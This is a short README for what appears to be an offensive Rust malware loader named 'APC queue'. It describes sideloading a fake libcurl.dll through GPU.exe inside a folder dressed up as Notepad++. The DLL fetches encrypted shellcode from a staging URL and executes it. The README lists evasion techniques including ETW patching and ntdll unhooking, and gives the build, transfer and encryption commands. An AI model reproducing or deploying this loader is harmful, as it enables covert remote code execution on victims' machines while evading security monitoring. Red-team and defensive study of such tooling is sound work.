# APC queue

## Execution flow

1. Drop `Notepad++` folder in `~\AppData\Local\Programs\`
2. Run `GPU.exe` to sideload the DLL
3. `libcurl.dll` fetches encoded shellcode from web server
4. `libcurl.dll` executes shellcode

## Evasion features

- PEB walk
- ETW patch
- Ntdll unhook
- Stacked strings
- Local shellcode injection using `Nt*` APIs

## Usage

### Compile DLL

```rs
cargo build --release
```

### Transfer DLL

```bash
cp .\target\release\libcurl.dll ..\utils\Notepad++\updater\
```

### Encrypt shellcode (Careful to use the same KEY and NONCE)

```rs
./aes-gcm-encryptor.exe <shellcode.bin>
```

### Modify staging URL
> Default `http://127.0.0.1/updater.enc`